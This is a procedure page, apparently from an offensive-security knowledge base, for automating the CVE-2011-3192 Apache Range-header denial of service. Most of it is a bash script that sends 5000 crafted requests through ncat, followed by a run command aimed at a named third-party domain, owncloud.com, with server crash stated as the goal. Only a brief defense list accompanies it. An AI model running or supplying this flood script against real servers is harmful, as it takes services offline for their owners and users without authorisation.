---
id: proc-uuid-003
tags:
  - dos
  - apache
  - poc
  - automation
type: procedure
tools:
  - '[[tools/ncat]]'
tactics:
  - '[[Impact]]'
commands:
  - '[[commands/create-apache-dos-script]]'
  - '[[commands/run-apache-dos-script]]'
verified: false
platforms:
  - Web
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Network Denial of Service]]'
updated_at: '2025-12-14T17:26:36.995Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques:
  - '[[Direct Network Flood]]'
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Network Denial of Service]]'
---
# Automate-Apache-DoS-with-PoC-Script

## Summary

This procedure automates the CVE-2011-3192 DoS attack using a bash script to generate and send 5000 malicious HTTP requests with overlapping Range headers via ncat, amplifying server resource exhaustion to cause slowdown or crash.

## Description

Building on manual testing, the PoC script constructs a request file with the full Range payload and loops transmission to owncloud.com on port 80/443. It handles HTTP/HTTPS via ncat options and cleans up temp files. Targeted at confirmed vulnerable Apache instances, this scales the attack for real impact. Prerequisites: ncat installed, script execution permissions, and target access. Expected: Server unresponsiveness after repeated requests.

## Requirements

1. ncat (from nmap suite) installed
2. Bash shell environment
3. Network access to target

## Defense

Defensive measures and detection strategies:

- Implement rate limiting on HTTP requests per IP
- Use intrusion detection to flag repeated identical Range headers
- Load balance and monitor CPU/memory for sudden spikes from single endpoints

## Objectives

1. Automate and scale the DoS for sustained impact
2. Simulate multi-threaded attack from one host
3. Validate server crash under load

## Instructions

### Step 1: Create the PoC Script

**Context**: Write the bash script to build the request and loop sends.

**Command** ([[commands/create-apache-dos-script]]):
```bash
cat > apache_dos_poc.sh << 'EOF'
#!/bin/bash
TARGET="$1"
PORT=${2:-80}
CMD='ncat'
if [ -z "$TARGET" ]; then
  echo "Usage: $0 <target> [port]"
  exit 1
fi
if [ "$PORT" = "443" ]; then CMD='ncat --ssl'; fi
BUFFER='Range: bytes=0-,5-0,5-1,5-2,5-3,5-4,5-5,5-6,...[full list of 1300 overlapping ranges]'
echo "GET / HTTP/1.1" > /tmp/buf
echo "Host: $TARGET" >> /tmp/buf
echo "$BUFFER" >> /tmp/buf
echo "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:18.0) Gecko/20100101 Firefox/18.0" >> /tmp/buf
echo "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" >> /tmp/buf
echo "Accept-Language: en-US,en;q=0.5" >> /tmp/buf
echo "Accept-Encoding: gzip, deflate" >> /tmp/buf
echo "Connection: close" >> /tmp/buf
echo "" >> /tmp/buf
for a in {1..5000}; do
  cat /tmp/buf | $CMD $TARGET $PORT
  echo "Request: $a"
done
rm -f /tmp/buf
EOF
chmod +x apache_dos_poc.sh
```

> Creates executable script; verify with cat apache_dos_poc.sh. Expected: Script file ready for execution.

### Step 2: Execute the Script

**Context**: Run the script against the target to flood with malicious requests.

**Command** ([[commands/run-apache-dos-script]]):
```bash
./apache_dos_poc.sh owncloud.com 80
```

> Sends 5000 requests; monitor with echo outputs. Expected: Progress counts and server degradation observable via parallel normal requests.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]] Impact

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[Network Denial of Service]] Network Denial of Service

### Sub-Techniques

- [[Direct Network Flood]] HTTP Request Flood

## Commands Used

- [[commands/create-apache-dos-script]]
- [[commands/run-apache-dos-script]]

## Tools Used

- [[tools/ncat]]

## Tags

- dos
- apache
- poc
- automation
